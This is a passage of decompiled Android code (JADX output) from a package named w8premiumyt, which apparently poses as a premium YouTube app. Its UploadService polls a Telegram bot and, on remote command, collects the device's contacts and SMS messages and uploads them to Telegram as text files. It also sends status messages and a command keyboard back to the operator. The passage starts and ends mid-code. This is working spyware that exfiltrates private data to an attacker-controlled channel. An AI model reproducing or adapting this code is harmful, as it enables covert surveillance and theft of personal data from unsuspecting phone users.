                            this.this$0.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۳String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$this$callclose$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.this$0.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۸String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$this$callclose$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()).post(builder.add(str, str2).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۹String$arg0$calladd$$this$calladd$$this$callbuild$valanswerReq$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۹String$arg1$calladd$$this$calladd$$this$callbuild$valanswerReq$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۶۵String$arg0$calladd$$this$callbuild$valanswerReq$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰۰String$arg1$calladd$$this$callbuild$valanswerReq$try$fun$anonymous$$arg2$calllaunch$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()).build()).build()).execute().close();
                            break;
                        } catch (Exception e) {
                        }
                        return Unit.INSTANCE;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$2, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$2", f = "UploadService.kt", i = {}, l = {1523}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $msg;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass2(UploadService uploadService, String str, Continuation<? super AnonymousClass2> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$msg = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass2(this.this$0, this.$msg, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۱۶String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$msg, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$3, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$3", f = "UploadService.kt", i = {}, l = {1529}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass3(UploadService uploadService, Continuation<? super AnonymousClass3> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass3(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        String replyMarkup = this.this$0.buildCommandsKeyboard();
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۷String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch3$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$4, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$4", f = "UploadService.kt", i = {}, l = {1533}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass4 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass4(UploadService uploadService, Continuation<? super AnonymousClass4> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass4(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch4$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$5, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$5", f = "UploadService.kt", i = {}, l = {1539}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass5 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $msg;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass5(UploadService uploadService, String str, Continuation<? super AnonymousClass5> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$msg = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass5(this.this$0, this.$msg, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۱String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch5$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$msg, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$6, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$6", f = "UploadService.kt", i = {}, l = {1544}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass6 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $url;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass6(UploadService uploadService, String str, Continuation<? super AnonymousClass6> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$url = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass6(this.this$0, this.$url, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۳String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch6$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$url, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$7, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$7", f = "UploadService.kt", i = {}, l = {1556}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass7 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass7(UploadService uploadService, Continuation<? super AnonymousClass7> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass7(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch8$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$8, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$8", f = "UploadService.kt", i = {}, l = {1560}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass8 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass8(UploadService uploadService, Continuation<? super AnonymousClass8> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass8(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch9$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$9, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$9", f = "UploadService.kt", i = {}, l = {1564}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass9 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass9(UploadService uploadService, Continuation<? super AnonymousClass9> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass9(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch10$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$10, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$10", f = "UploadService.kt", i = {}, l = {1565}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass10 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass10(UploadService uploadService, Continuation<? super AnonymousClass10> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass10(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getContactsInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۴String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch10$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$11, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$11", f = "UploadService.kt", i = {}, l = {1569}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass11 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass11(UploadService uploadService, Continuation<? super AnonymousClass11> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass11(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch11$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$12, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$12", f = "UploadService.kt", i = {}, l = {1573}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass12 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass12(UploadService uploadService, Continuation<? super AnonymousClass12> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass12(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch12$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$13, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$13", f = "UploadService.kt", i = {}, l = {1574}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass13 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass13(UploadService uploadService, Continuation<? super AnonymousClass13> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass13(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getSMSInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۶String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch12$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$14, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$14", f = "UploadService.kt", i = {}, l = {1578}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass14 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass14(UploadService uploadService, Continuation<? super AnonymousClass14> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass14(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch13$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
